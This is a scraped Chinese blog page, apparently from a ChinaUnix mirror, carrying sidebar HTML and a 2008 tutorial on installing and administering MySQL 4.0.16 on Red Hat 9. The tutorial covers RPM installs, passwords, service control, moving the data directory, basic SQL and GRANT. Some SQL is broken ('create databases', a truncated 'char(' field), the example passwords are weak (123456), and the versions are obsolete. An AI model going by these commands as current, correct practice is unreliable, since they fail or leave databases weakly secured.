                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-201002-list-1.html"&gt;2010年02月&lt;/a&gt;（2）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-201001-list-1.html"&gt;2010年01月&lt;/a&gt;（1）&lt;/li&gt;

                  &lt;/ul&gt;

                &lt;p class="Blog_p4"&gt;&lt;span class="Blog_jia1"&gt;&lt;/span&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-2009-list-1.html"&gt;2009年&lt;/a&gt;（9）&lt;/p&gt;

      &lt;ul style="display:none;" class="Blog_ul3 zk"&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200909-list-1.html"&gt;2009年09月&lt;/a&gt;（1）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200908-list-1.html"&gt;2009年08月&lt;/a&gt;（2）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200901-list-1.html"&gt;2009年01月&lt;/a&gt;（6）&lt;/li&gt;

                  &lt;/ul&gt;

                &lt;p class="Blog_p4"&gt;&lt;span class="Blog_jia1"&gt;&lt;/span&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-2008-list-1.html"&gt;2008年&lt;/a&gt;（115）&lt;/p&gt;

      &lt;ul style="display:none;" class="Blog_ul3 zk"&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200812-list-1.html"&gt;2008年12月&lt;/a&gt;（16）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200811-list-1.html"&gt;2008年11月&lt;/a&gt;（10）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200810-list-1.html"&gt;2008年10月&lt;/a&gt;（3）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200809-list-1.html"&gt;2008年09月&lt;/a&gt;（7）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200808-list-1.html"&gt;2008年08月&lt;/a&gt;（28）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200807-list-1.html"&gt;2008年07月&lt;/a&gt;（51）&lt;/li&gt;

                  &lt;/ul&gt;

                &lt;p class="Blog_p4"&gt;&lt;span class="Blog_jia1"&gt;&lt;/span&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-2006-list-1.html"&gt;2006年&lt;/a&gt;（3）&lt;/p&gt;

      &lt;ul style="display:none;" class="Blog_ul3 zk"&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200604-list-1.html"&gt;2006年04月&lt;/a&gt;（3）&lt;/li&gt;

                  &lt;/ul&gt;

                &lt;p class="Blog_p4"&gt;&lt;span class="Blog_jia1"&gt;&lt;/span&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-2005-list-1.html"&gt;2005年&lt;/a&gt;（2）&lt;/p&gt;

      &lt;ul style="display:none;" class="Blog_ul3 zk"&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200507-list-1.html"&gt;2005年07月&lt;/a&gt;（1）&lt;/li&gt;

                    &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20019131/year-200506-list-1.html"&gt;2005年06月&lt;/a&gt;（1）&lt;/li&gt;

                  &lt;/ul&gt;

              &lt;/div&gt;

  &lt;/div&gt;

                &lt;div class="Blog_left2 Blog_bg1"&gt;

    &lt;div class="Blog_tit1"&gt;我的朋友&lt;/div&gt;

    &lt;ul class="Blog_ul4"&gt;

                &lt;li&gt;&lt;a href="http://archulate.github.io/uid/7944836.html"&gt;&lt;img src="http://passport.ixpub.net/data/avatar/007/94/48/36_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /&gt;&lt;/a&gt;

        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/7944836.html" title="send_linux"&gt;send_lin&lt;/a&gt;&lt;/p&gt;

      &lt;/li&gt;

                &lt;li&gt;&lt;a href="http://archulate.github.io/uid/792340.html"&gt;&lt;img src="http://passport.ixpub.net/data/avatar/000/79/23/40_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /&gt;&lt;/a&gt;

        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/792340.html" title="forrestrun"&gt;forrestr&lt;/a&gt;&lt;/p&gt;

      &lt;/li&gt;

                &lt;li&gt;&lt;a href="http://archulate.github.io/uid/14174896.html"&gt;&lt;img src="http://passport.ixpub.net/data/avatar/014/17/48/96_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /&gt;&lt;/a&gt;

        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/14174896.html" title="ahjobusb"&gt;ahjobusb&lt;/a&gt;&lt;/p&gt;

      &lt;/li&gt;

                &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20012471.html"&gt;&lt;img src="http://passport.ixpub.net/data/avatar/020/01/24/71_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /&gt;&lt;/a&gt;

        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/20012471.html" title="linuxe"&gt;linuxe&lt;/a&gt;&lt;/p&gt;

      &lt;/li&gt;

                &lt;li&gt;&lt;a href="http://archulate.github.io/uid/20511150.html"&gt;&lt;img src="http://passport.ixpub.net/data/avatar/020/51/11/50_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /&gt;&lt;/a&gt;

        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/20511150.html" title="liang3391"&gt;liang339&lt;/a&gt;&lt;/p&gt;

      &lt;/li&gt;

              &lt;/ul&gt;

  &lt;/div&gt;

            &lt;div class="Blog_left2 Blog_bg1"&gt;

    &lt;div class="Blog_tit1"&gt;最近访客&lt;/div&gt;

    &lt;ul class="Blog_ul4"&gt;

                &lt;li&gt;&lt;a href="http://archulate.github.io/uid/29483716.html"&gt;&lt;img src="http://passport.ixpub.net/data/avatar/029/48/37/16_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /&gt;&lt;/a&gt;

        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/29483716.html" title="liucencen"&gt;liucence&lt;/a&gt;&lt;/p&gt;

      &lt;/li&gt;

                &lt;li&gt;&lt;a href="http://archulate.github.io/uid/28336510.html"&gt;&lt;img src="http://passport.ixpub.net/data/avatar/028/33/65/10_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /&gt;&lt;/a&gt;

        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/28336510.html" title="ydjh460"&gt;ydjh460&lt;/a&gt;&lt;/p&gt;

      &lt;/li&gt;

                &lt;li&gt;&lt;a href="http://archulate.github.io/uid/10363961.html"&gt;&lt;img src="http://passport.ixpub.net/data/avatar/010/36/39/61_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /&gt;&lt;/a&gt;

        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/10363961.html" title="cybermerman"&gt;cybermer&lt;/a&gt;&lt;/p&gt;

      &lt;/li&gt;

                &lt;li&gt;&lt;a href="http://archulate.github.io/uid/16587062.html"&gt;&lt;img src="http://passport.ixpub.net/data/avatar/016/58/70/62_avatar_small.jpg" onerror="this.onerror=null;this.src='http://passport.ixpub.net/images/noavatar_small.gif'" /&gt;&lt;/a&gt;

        &lt;p&gt;&lt;a href="http://archulate.github.io/uid/16587062.html" title="siyan019"&gt;siyan019&lt;/a&gt;&lt;/p&gt;

      &lt;/li&gt;

              &lt;/ul&gt;

  &lt;/div&gt;

        &lt;div class="Blog_left2 Blog_bg1"&gt;

    &lt;div class="Blog_tit1"&gt;订阅&lt;/div&gt;

    &lt;ul class="Blog_ul5"&gt;

      &lt;li&gt;&lt;a href="http://archulate.github.io/blog/rss/uid/20019131.html" class="Blog_a4"&gt;&lt;/a&gt;&lt;/li&gt;

      &lt;li&gt;&lt;a href="http://www.google.com/ig/add?feedurl=http%3A%2F%2Fblog.chinaunix.net%2Fuid%2F20019131.html" class="Blog_a5"&gt;&lt;/a&gt;&lt;/li&gt;

    &lt;/ul&gt;

  &lt;/div&gt;

  &lt;div class="Blog_left2 Blog_left3 Blog_bg1"&gt;

    &lt;div class="Blog_tit1"&gt;推荐博文&lt;/div&gt;

    &lt;ul class="Blog_ul6"&gt;

                        &lt;li&gt;·&lt;a href="http://archulate.github.io/uid-10661836-id-4124968.html" title="详解Percona的XtraBackup备份工具(下篇)"&gt;详解Percona的XtraBackup备份...&lt;/a&gt;&lt;/li&gt;

                &lt;li&gt;·&lt;a href="http://archulate.github.io/uid-22312037-id-4126734.html" title="HBase初探之安装与配置"&gt;HBase初探之安装与配置...&lt;/a&gt;&lt;/li&gt;

                &lt;li&gt;·&lt;a href="http://archulate.github.io/uid-22788794-id-4126665.html" title="yii2权限(RBAC)"&gt;yii2权限(RBAC)&lt;/a&gt;&lt;/li&gt;

                &lt;li&gt;·&lt;a href="http://archulate.github.io/uid-25472509-id-4126539.html" title="[PB]数据窗口自动换行"&gt;[PB]数据窗口自动换行...&lt;/a&gt;&lt;/li&gt;

                &lt;li&gt;·&lt;a href="http://archulate.github.io/uid-29068468-id-4126424.html" title="nginx变量 "&gt;nginx变量 &lt;/a&gt;&lt;/li&gt;

                    &lt;/ul&gt;

  &lt;/div&gt;

  &lt;div class="Blog_left2 Blog_left3 Blog_bg1"&gt;

    &lt;div class="Blog_tit1"&gt;热词专题&lt;/div&gt;

    &lt;ul class="Blog_ul6"&gt;

                    &lt;li &gt;·&lt;a href="http://archulate.github.io/zt/1009/linuxftpjujiang_1009741.shtml" target='blank' title='linux---tftp设置'&gt;linux---tftp设置&lt;/a&gt;&lt;/li&gt;

                    &lt;li &gt;·&lt;a href="http://archulate.github.io/zt/1050/suselinuxhongfuraidgong_1050177.shtml" target='blank' title='RAID组中的“Foreign”状态磁盘'&gt;RAID组中的“Foreign”状态磁...&lt;/a&gt;&lt;/li&gt;

                    &lt;li &gt;·&lt;a href="http://archulate.github.io/zt/1042/windowsduoha_1042227.shtml" target='blank' title='Windows服务编程'&gt;Windows服务编程&lt;/a&gt;&lt;/li&gt;

                    &lt;li &gt;·&lt;a href="http://archulate.github.io/zt/1037/undotbsjin_1037965.shtml" target='blank' title='如果undo表空间undotbs不能释放空间,重建之'&gt;如果undo表空间undotbs不能释...&lt;/a&gt;&lt;/li&gt;

                    &lt;li class="no_line1"&gt;·&lt;a href="http://archulate.github.io/zt/1006/ubuntu1110qq_1006698.shtml" target='blank' title='ubuntu11.10 安装mkimage工具'&gt;ubuntu11.10 安装mkimage工具...&lt;/a&gt;&lt;/li&gt;

              &lt;/ul&gt;

  &lt;/div&gt;





&lt;/div&gt;
</code></pre>

<p><script language="javascript"></p>

<p>$(document).ready(function(){</p>

<pre><code>/*目录树JS效果*/

$('#blogCla li &gt; span').click(function(){

    var cla = $(this).attr('class');

    if(cla == 'Blog_jia1'){

        //$('#blogCla li &gt; span').removeClass('Blog_jian1').addClass('Blog_jia1');

        //$('#blogCla li &gt; .zk').css('display', 'none');



        $(this).removeClass('Blog_jia1').addClass('Blog_jian1');

        $(this).parent().children('.zk').css('display', 'block');

    }else{

        $(this).removeClass('Blog_jian1').addClass('Blog_jia1');

        $(this).parent().children('.zk').css('display', 'none');

    }

});



$('#blogdtr &gt; p &gt; span').click(function(){

    var cla = $(this).attr('class');

    if(cla == 'Blog_jia1'){

        //$('#blogdtr &gt; .Blog_p4 &gt; span').removeClass('Blog_jian1').addClass('Blog_jia1');

        //$('#blogdtr ul').css('display', 'none');



        $(this).removeClass('Blog_jia1').addClass('Blog_jian1');

        $(this).parent().next().css('display', 'block');

    }else{

        $(this).removeClass('Blog_jian1').addClass('Blog_jia1');

        $(this).parent().next().css('display', 'none');

    }

});
</code></pre>

<p>});</p>

<p></script>    <!-- 右 --></p>

<pre><code>&lt;div class="Blog_right1"&gt;

  &lt;div class="Blog_right1_1 Blog_right1_11"&gt;

    &lt;div class="Blog_right1_2 "&gt;

        &lt;!--推荐博文--&gt;

      &lt;div class="Blog_tit4 Blog_tit5"&gt;

                    &lt;b class="Blog_b1"&gt;&lt;/b&gt;

        &lt;a href="http://archulate.github.io/uid-20019131-id-1987421.html"&gt;linux下关于mySQL的安装和配置&lt;/a&gt;

        &lt;em&gt;2008-07-28 14:03:56&lt;/em&gt;

      &lt;/div&gt;

      &lt;div class="Blog_con2"&gt;

        &lt;div class="Blog_con3"&gt;

          &lt;p&gt;分类： &lt;span&gt;LINUX&lt;/span&gt;&lt;/p&gt;

                        &lt;/p&gt;

        &lt;/div&gt;

       &lt;div class="Blog_wz1" style='word-wrap: break-word;'&gt;

        &lt;DIV&gt;linux下关于mySQL的安装和配置 &lt;/DIV&gt;
</code></pre>

<p><DIV><BR>这篇博文很经典！推荐给大家！</DIV></p>

<p><DIV>一、引言 <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 想使用Linux已经很长时间了，由于没有硬性任务一直也没有系统学习，近日由于工作需要必须使用Linux下的MySQL。本以为有Windows下使用SQL Server的经验，觉得在</DIV></p>

<p><DIV>Linux下安装MySql应该是易如反掌的事，可在真正安装和使用MySQL时走了很多弯路，遇见很多问题，毕竟Linux 和Windows本身就有很大区别。为了让和我一样的初学者在学习的</DIV></p>

<p><DIV>过程中少走弯路，尽快入门，写了此文，希望对您有所帮助。本文的Linux环境是 Red Hat 9.0，MySQL是4.0.16。</DIV></p>

<p><DIV>二、安装Mysql <BR>　　 1、下载MySQL的安装文件 <BR>　　 安装MySQL需要下面两个文件： <BR>　　 MySQL-server-4.0.16-0.i386.rpm　　　 <BR>　　 MySQL-client-4.0.16-0.i386.rpm <BR>　　 下载地址为：<A href="http://www.mysql.com/downloads/mysql-4.0.html"><a href="http://www.mysql.com/downloads/mysql-4.0.html">http://www.mysql.com/downloads/mysql-4.0.html</a></A>，打开此网页，下拉网页找到“Linux x86 RPM downloads”项，找到“Server”和“Client programs”项</DIV></p>

<p><DIV>，下载需要的上述两个rpm文件。 </DIV></p>

<p><DIV>　　 2、安装MySQL <BR>　　 rpm文件是Red Hat公司开发的软件安装包，rpm可让Linux在安装软件包时免除许多复杂的手续。该命令在安装时常用的参数是 –ivh ,其中i表示将安装指定的rmp软件包，V</DIV></p>

<p><DIV>表示安装时的详细信息，h表示在安装期间出现“#”符号来显示目前的安装过程。这个符号将持续到安装完成后才停止。<BR>&nbsp;<BR>1）安装服务器端 <BR>　　 在有两个rmp文件的目录下运行如下命令： <BR>　　 [root@test1 local]# rpm -ivh MySQL-server-4.0.16-0.i386.rpm <BR>　　 显示如下信息。 <BR>　　　 warning: MySQL-server-4.0.16-0.i386.rpm: V3 DSA signature: NOKEY, key ID 5072e1f5 <BR>　　 Preparing&hellip;　　　　　　　########################################### [100%] <BR>　　 1:MySQL-server　　　　　########################################### [100%] <BR>　　　 。。。。。。（省略显示） <BR>　　 /usr/bin/mysqladmin -u root password &lsquo;new-password&rsquo; <BR>　　 /usr/bin/mysqladmin -u root -h test1 password &lsquo;new-password&rsquo; <BR>　　　 。。。。。。（省略显示） <BR>　　 Starting mysqld daemon with databases from /var/lib/mysql <BR>　　 如出现如上信息，服务端安装完毕。测试是否成功可运行netstat看Mysql端口是否打开，如打开表示服务已经启动，安装成功。Mysql默认的端口是3306。<BR>&nbsp;<BR>[root@test1 local]# netstat -nat <BR>　　 Active Internet connections (servers and established) <BR>　　 Proto Recv-Q Send-Q Local Address　　　　　 Foreign Address　　　　 State　　　 <BR>　　 tcp　　0　　0 0.0.0.0:3306　　　　 0.0.0.0:*　　　　　 LISTEN　　　 <BR>　　 上面显示可以看出MySQL服务已经启动。 <BR>　　 2）安装客户端 <BR>　　 运行如下命令： <BR>　　 [root@test1 local]# rpm -ivh MySQL-client-4.0.16-0.i386.rpm <BR>　　 warning: MySQL-client-4.0.16-0.i386.rpm: V3 DSA signature: NOKEY, key ID 5072e1f5 <BR>　　 Preparing&hellip;　　　　########################################### [100%] <BR>　　 1:MySQL-client　 ########################################### [100%] <BR>　　 显示安装完毕。 <BR>　　 用下面的命令连接mysql,测试是否成功。</DIV></p>

<p><DIV>三、登录MySQL </DIV></p>

<p><DIV>　　 登录MySQL的命令是mysql， mysql 的使用语法如下： <BR>　　 mysql [-u username] [-h host] [-p[password]] [dbname] <BR>　　 username 与 password 分别是 MySQL 的用户名与密码，mysql的初始管理帐号是root，没有密码，注意：这个root用户不是Linux的系统用户。MySQL默认用户是root，由于</DIV></p>

<p><DIV>初始没有密码，第一次进时只需键入mysql即可。 <BR>　　 [root@test1 local]# mysql <BR>　　 Welcome to the MySQL monitor.　Commands end with ; or \g. <BR>　　 Your MySQL connection id is 1 to server version: 4.0.16-standard <BR>　　 Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the buffer. <BR>　　 mysql&gt; <BR>　　 出现了“mysql&gt;”提示符，恭喜你，安装成功！ <BR>　　 增加了密码后的登录格式如下： <BR>　　 mysql -u root -p <BR>　　 Enter password: (输入密码) <BR>　　 其中-u后跟的是用户名，-p要求输入密码，回车后在输入密码处输入密码。 </DIV></p>

<p><DIV>　　 注意：这个mysql文件在/usr/bin目录下，与后面讲的启动文件/etc/init.d/mysql不是一个文件。</DIV></p>

<p><DIV>四、MySQL的几个重要目录 </DIV></p>

<p><DIV>　　 MySQL安装完成后不象SQL Server默认安装在一个目录，它的数据库文件、配置文件和命令文件分别在不同的目录，了解这些目录非常重要，尤其对于Linux的初学者，因为 </DIV></p>

<p><DIV>Linux本身的目录结构就比较复杂，如果搞不清楚MySQL的安装目录那就无从谈起深入学习。 </DIV></p>

<p><DIV>　　 下面就介绍一下这几个目录。 </DIV></p>

<p><DIV>　　 1、数据库目录 <BR>　　 /var/lib/mysql/ </DIV></p>

<p><DIV>　　 2、配置文件 <BR>　　 /usr/share/mysql（mysql.server命令及配置文件） </DIV></p>

<p><DIV>　　 3、相关命令 <BR>　　 /usr/bin(mysqladmin mysqldump等命令) </DIV></p>

<p><DIV>　　 4、启动脚本 <BR>　　 /etc/rc.d/init.d/（启动脚本文件mysql的目录）</DIV></p>

<p><DIV>五、修改登录密码 </DIV></p>

<p><DIV>　　 MySQL默认没有密码，安装完毕增加密码的重要性是不言而喻的。 <BR>　　 1、命令 <BR>　　 usr/bin/mysqladmin -u root password &lsquo;new-password&rsquo; <BR>　　 格式：mysqladmin -u用户名 -p旧密码 password 新密码 <BR>　　 2、例子 <BR>　　 例1：给root加个密码123456。 <BR>　　 键入以下命令 ： <BR>　　 [root@test1 local]# /usr/bin/mysqladmin -u root password 123456 <BR>　　 注：因为开始时root没有密码，所以-p旧密码一项就可以省略了。</DIV></p>

<p><DIV>3、测试是否修改成功 <BR>　　 1）不用密码登录 <BR>　　 [root@test1 local]# mysql <BR>　　 ERROR 1045: Access denied for user: <A href="mailto:'root@localhost'">&lsquo;root@localhost&rsquo;</A> (Using password: NO) <BR>　　 显示错误，说明密码已经修改。 <BR>　　 2）用修改后的密码登录 <BR>　　 [root@test1 local]# mysql -u root -p <BR>　　 Enter password: (输入修改后的密码123456) <BR>　　 Welcome to the MySQL monitor.　Commands end with ; or \g. <BR>　　 Your MySQL connection id is 4 to server version: 4.0.16-standard <BR>　　 Type &lsquo;help;&rsquo; or &lsquo;\h&rsquo; for help. Type &lsquo;\c&rsquo; to clear the buffer. <BR>　　 mysql&gt; <BR>　　 成功！ <BR>　　 这是通过mysqladmin命令修改口令，也可通过修改库来更改口令。</DIV></p>

<p><DIV><BR>六、启动与停止 </DIV></p>

<p><DIV>　　 1、启动 <BR>　　 MySQL安装完成后启动文件mysql在/etc/init.d目录下，在需要启动时运行下面命令即可。 <BR>　　 [root@test1 init.d]# /etc/init.d/mysql start </DIV></p>

<p><DIV>　　 2、停止 <BR>　　 /usr/bin/mysqladmin -u root -p shutdown </DIV></p>

<p><DIV>　　 3、自动启动 <BR>　　 1）察看mysql是否在自动启动列表中 <BR>　　 [root@test1 local]#　/sbin/chkconfig –list <BR>　　 2）把MySQL添加到你系统的启动服务组里面去 <BR>　　 [root@test1 local]#　/sbin/chkconfig　– add　mysql <BR>　　 3）把MySQL从启动服务组里面删除。 <BR>　　 [root@test1 local]#　/sbin/chkconfig　– del　mysql<BR>&nbsp;<BR>七、更改MySQL目录 </DIV></p>

<p><DIV>　　 MySQL默认的数据文件存储目录为/var/lib/mysql。假如要把目录移到/home/data下需要进行下面几步： </DIV></p>

<p><DIV>　　 1、home目录下建立data目录 <BR>　　 cd /home <BR>　　 mkdir data </DIV></p>

<p><DIV>　　 2、把MySQL服务进程停掉： <BR>　　 mysqladmin -u root -p shutdown </DIV></p>

<p><DIV>　　 3、把/var/lib/mysql整个目录移到/home/data <BR>　　 mv /var/lib/mysql　/home/data/ <BR>　　 这样就把MySQL的数据文件移动到了/home/data/mysql下 </DIV></p>

<p><DIV>　　 4、找到my.cnf配置文件 <BR>　　 如果/etc/目录下没有my.cnf配置文件，请到/usr/share/mysql/下找到*.cnf文件，拷贝其中一个到/etc/并改名为my.cnf)中。命令如下： <BR>　　 [root@test1 mysql]# cp /usr/share/mysql/my-medium.cnf　/etc/my.cnf </DIV></p>

<p><DIV>　　 5、编辑MySQL的配置文件/etc/my.cnf <BR>　　 为保证MySQL能够正常工作，需要指明mysql.sock文件的产生位置。 修改socket=/var/lib/mysql/mysql.sock一行中等号右边的值为：/home/mysql/mysql.sock 。操作如下</DIV></p>

<p><DIV>： <BR>　　 vi　 my.cnf　　　 (用vi工具编辑my.cnf文件，找到下列数据修改之) <BR>　　 # The MySQL server <BR>　　　 [mysqld] <BR>　　　 port　　　= 3306 <BR>　　　 #socket　 = /var/lib/mysql/mysql.sock（原内容，为了更稳妥用“#”注释此行） <BR>　　　 socket　 = /home/data/mysql/mysql.sock　　　（加上此行） </DIV></p>

<p><DIV>　　 6、修改MySQL启动脚本/etc/rc.d/init.d/mysql <BR>　　 最后，需要修改MySQL启动脚本/etc/rc.d/init.d/mysql，把其中datadir=/var/lib/mysql一行中，等号右边的路径改成你现在的实际存放路径：home/data/mysql。 <BR>　　 [root@test1 etc]# vi　/etc/rc.d/init.d/mysql <BR>　　 #datadir=/var/lib/mysql　　　　（注释此行） <BR>　　 datadir=/home/data/mysql　　 （加上此行） </DIV></p>

<p><DIV>　　 7、重新启动MySQL服务 <BR>　　 /etc/rc.d/init.d/mysql　start <BR>　　 或用reboot命令重启Linux <BR>　　 如果工作正常移动就成功了，否则对照前面的7步再检查一下。<BR>&nbsp; <BR>八、MySQL的常用操作 </DIV></p>

<p><DIV>　　 注意：MySQL中每个命令后都要以分号；结尾。 </DIV></p>

<p><DIV>　　 1、显示数据库 <BR>　　 mysql&gt; show databases; <BR>　　 +&mdash;&mdash;&mdash;&mdash;&mdash;+ <BR>　　 | Database | <BR>　　 +&mdash;&mdash;&mdash;&mdash;&mdash;+ <BR>　　 | mysql　　| <BR>　　 | test　　 | <BR>　　 +&mdash;&mdash;&mdash;&mdash;&mdash;+ <BR>　　 2 rows in set (0.04 sec) <BR>　　 Mysql刚安装完有两个数据库：mysql和test。mysql库非常重要，它里面有MySQL的系统信息，我们改密码和新增用户，实际上就是用这个库中的相关表进行操作。 </DIV></p>

<p><DIV>　　 2、显示数据库中的表 <BR>　　 mysql&gt; use mysql; （打开库，对每个库进行操作就要打开此库，类似于foxpro ） <BR>　　 Database changed </DIV></p>

<p><DIV>　　 mysql&gt; show tables; <BR>　　 +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+ <BR>　　 | Tables_in_mysql | <BR>　　 +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+ <BR>　　 | columns_priv　　| <BR>　　 | db　　　　　　　| <BR>　　 | func　　　　　　| <BR>　　 | host　　　　　　| <BR>　　 | tables_priv　　 | <BR>　　 | user　　　　　　| <BR>　　 +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+ <BR>　　 6 rows in set (0.01 sec) </DIV></p>

<p><DIV>　　 3、显示数据表的结构： <BR>　　 describe 表名; </DIV></p>

<p><DIV>　　 4、显示表中的记录： <BR>　　 select * from 表名; <BR>　　 例如：显示mysql库中user表中的纪录。所有能对MySQL用户操作的用户都在此表中。 <BR>　　 Select * from user; </DIV></p>

<p><DIV>　　 5、建库： <BR>　　 create database 库名; <BR>　　 例如：创建一个名字位aaa的库 <BR>　　 mysql&gt; create databases aaa; <BR>6、建表： <BR>　　 use 库名； <BR>　　 create table 表名 (字段设定列表)； <BR>　　 例如：在刚创建的aaa库中建立表name,表中有id(序号，自动增长)，xm（姓名）,xb（性别）,csny（出身年月）四个字段 <BR>　　 use aaa; <BR>　　 mysql&gt; create table name (id int(3) auto_increment not null primary key, xm char(,xb char(2),csny date); <BR>　　 可以用describe命令察看刚建立的表结构。 <BR>　　 mysql&gt; describe name; </DIV></p>

<p><DIV>　　 +&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ <BR>　　 | Field | Type　　| Null | Key | Default | Extra　　　　　| <BR>　　 +&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ <BR>　　 | id　　| int(3)　|　　　| PRI | NULL　　| auto_increment | <BR>　　 | xm　　| char( | YES　|　　 | NULL　　|　　　　　　　　| <BR>　　 | xb　　| char(2) | YES　|　　 | NULL　　|　　　　　　　　| <BR>　　 | csny　| date　　| YES　|　　 | NULL　　|　　　　　　　　| <BR>　　 +&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&ndash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ </DIV></p>

<p><DIV>　　 7、增加记录 <BR>　　 例如：增加几条相关纪录。 <BR>　　 mysql&gt; insert into name values(&lsquo;&rsquo;,&lsquo;张三&rsquo;,&lsquo;男&rsquo;,&lsquo;1971-10-01&rsquo;); <BR>　　 mysql&gt; insert into name values(&lsquo;&rsquo;,&lsquo;白云&rsquo;,&lsquo;女&rsquo;,&lsquo;1972-05-20&rsquo;); <BR>　　 可用select命令来验证结果。 <BR>　　 mysql&gt; select * from name; <BR>　　 +&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ <BR>　　 | id | xm　 | xb　 | csny　　　 | <BR>　　 +&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ <BR>　　 |　1 | 张三 | 男　 | 1971-10-01 | <BR>　　 |　2 | 白云 | 女　 | 1972-05-20 | <BR>　　 +&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;+&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+ </DIV></p>

<p><DIV>　　 8、修改纪录 <BR>　　 例如：将张三的出生年月改为1971-01-10 <BR>　　 mysql&gt; update name set csny=&lsquo;1971-01-10&rsquo; where xm=&lsquo;张三&rsquo;; </DIV></p>

<p><DIV>　　 9、删除纪录 <BR>　　 例如：删除张三的纪录。 <BR>　　 mysql&gt; delete from name where xm=&lsquo;张三&rsquo;; </DIV></p>

<p><DIV>　　 10、删库和删表 <BR>　　 drop database 库名; <BR>　　 drop table 表名；</DIV></p>

<p><DIV> <BR>九、增加MySQL用户 </DIV></p>

<p><DIV>　　 格式：grant select on 数据库.* to 用户名@登录主机 identified by &ldquo;密码&rdquo; <BR>例1、增加一个用户user_1密码为123，让他可以在任何主机上登录，并对所有数据库有查询、插入、修改、删除的权限。首先用以root用户连入MySQL，然后键入以下命令： </DIV></p>

<p><DIV>　　 mysql&gt; grant select,insert,update,delete on <em>.</em> to <A href='mailto:user_1@"%'>user_1@&ldquo;%</A>&rdquo; Identified by &ldquo;123&rdquo;; <BR>例1增加的用户是十分危险的，如果知道了user_1的密码，那么他就可以在网上的任何一台电脑上登录你的MySQL数据库并对你的数据为所欲为了，解决办法见例2。 </DIV></p>

<p><DIV>　　例2、增加一个用户user_2密码为123,让此用户只可以在localhost上登录，并可以对数据库aaa进行查询、插入、修改、删除的操作（localhost指本地主机，即MySQL数据库所</DIV></p>

<p><DIV>在的那台主机），这样用户即使用知道user_2的密码，他也无法从网上直接访问数据库，只能通过 MYSQL主机来操作aaa库。 </DIV></p>

<p><DIV>　　 mysql&gt;grant select,insert,update,delete on aaa.* to <A href="mailto:user_2@localhost">user_2@localhost</A> identified by &ldquo;123&rdquo;; </DIV></p>

<p><DIV>　　 用新增的用户如果登录不了MySQL，在登录时用如下命令： </DIV></p>

<p><DIV>　　 mysql -u user_1 -p　-h 192.168.113.50　（-h后跟的是要登录主机的ip地址）</DIV></p>

